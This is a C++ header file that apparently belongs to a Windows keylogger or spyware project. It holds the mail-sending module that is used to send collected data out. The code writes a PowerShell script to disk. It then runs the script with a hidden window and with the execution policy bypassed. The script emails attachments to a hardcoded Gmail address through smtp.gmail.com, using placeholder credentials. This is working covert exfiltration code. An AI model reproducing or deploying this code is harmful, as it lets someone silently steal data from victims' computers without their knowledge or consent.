#ifndef SENDMAIL_H
#define SENDMAIL_H

#include <fstream>
#include <vector>
#include <Windows.h>
#include "IO.h"
#include "Timer.h"
#include "helper.h"

#define SCRIPT_NAME "sm.ps1"

namespace Mail
{
    #define X_EM_TO "XXXXX@gmail.com"
    #define X_EM_FROM "XXXXX@gmail.com"
    #define X_EM_PASS "XXXXXX"

    const std::string &PowerShellScript =
    "Param([Parameter(Mandatory=$true)]$Subject,[Parameter(Mandatory=$true)]$Body,[Parameter(Mandatory=$true)]$Attachment);$To = \"" + std::string(X_EM_TO) + "\"; $From = \"" + std::string(X_EM_FROM) + "\";$Password = \"" + std::string(X_EM_PASS) + "\";$SMTPServer = \"smtp.gmail.com\";$SMTPPort = \"587\";[string]$userName = $From.Split(\"@\")[0];[securestring]$secStringPassword = ConvertTo-SecureString $Password -AsPlainText -Force;[pscredential]$credOject = New-Object System.Management.Automation.PSCredential ($userName, $secStringPassword);Send-MailMessage -From $From -To $To -Subject $Subject -Body $Body -SmtpServer $SMTPServer -port $SMTPPort -UseSsl -Credential $credOject -Attachments $Attachment;exit 7;";


#undef X_EM_FROM
#undef X_EM_TO
#undef X_EM_PASS


        std::string StringReplace(std::string s, const std::string &what, const std::string &with)
        {
            if(what.empty())
                return s;

            size_t sp = 0;

            while((sp = s.find(what, sp)) != std::string::npos)
            {
                s.replace(sp, what.length(), with), sp += with.length();
            }
            return s;

        }

        bool CheckFileExists(const std::string &f)
        {
            std::ifstream file (f);
            return (bool) file;
        }

        bool CreateScript()
        {
            std::ofstream script(IO::GetOurPath(true) + std::string(SCRIPT_NAME));

            if(!script)
                return false;

            script << PowerShellScript;

            if(!script)
                return false;

            script.close();

            return true;
        }

        Timer m_timer;

        int SendMail(const std::string &subject, const std::string &body, const std::string &attachments)
        {
            bool ok;

            ok = IO::MKDir(IO::GetOurPath(true));
            if(!ok)
                return -1;

            std::string scr_path = IO::GetOurPath(true) + std::string(SCRIPT_NAME);

            if(!CheckFileExists(scr_path))
                ok=CreateScript();

            if(!ok)
                return -2;

            std::string param = "-ExecutionPolicy Bypass -File \"" + scr_path + "\" -Subject \""
                                + StringReplace(subject, "\"", "\\\"") +
                                "\" -Body \""
                                + StringReplace(body, "\"", "\\\"") + "\" -Attachment \"C:\\Users\\Andrew\\Desktop\\testfile.JPG\"";// +
                                //"\" -Attachment \"" + attachments + "\"";

            SHELLEXECUTEINFO ShExecInfo = {0};
            ShExecInfo.cbSize = sizeof(SHELLEXECUTEINFO);
            ShExecInfo.fMask = SEE_MASK_NOCLOSEPROCESS;
            ShExecInfo.hwnd = NULL;
            ShExecInfo.lpVerb = "open";
            ShExecInfo.lpFile = "powershell";
            ShExecInfo.lpParameters = param.c_str();
            ShExecInfo.lpDirectory = NULL;
            ShExecInfo.nShow = SW_HIDE;
            ShExecInfo.hInstApp = NULL;

            ok = (bool) ShellExecuteEx(&ShExecInfo);
            if(!ok)
                return -3;

            WaitForSingleObject(ShExecInfo.hProcess, 7000);
            DWORD exit_code = 100;


            GetExitCodeProcess(ShExecInfo.hProcess, &exit_code);

            m_timer.SetFunction([&]()
            {
                WaitForSingleObject(ShExecInfo.hProcess, 60000);
                GetExitCodeProcess(ShExecInfo.hProcess, &exit_code);
                if((int)exit_code == STILL_ACTIVE)
                    TerminateProcess(ShExecInfo.hProcess, 100);

                Helper::WriteAppLog("<From SendMail> Return code: " + Helper::toString((int)exit_code));
            });

            m_timer.RepeatCount(1L);
            m_timer.SetInterval(10L);
            m_timer.Start(true);
            return (int)exit_code;

        }

        int SendMail(const std::string &subject, const std::string &body,
                     const std::vector<std::string> &att)
        {
            std::string attachments = "";
            if(att.size() == 1U)
                attachments=att.at(0);
            else
            {
                for(const auto &v : att)
                    attachments += v + "::";

                attachments = attachments.substr(0, attachments.length() - 2);

            }

            return SendMail(subject, body, attachments);
        }


}

#endif // SENDMAIL_H
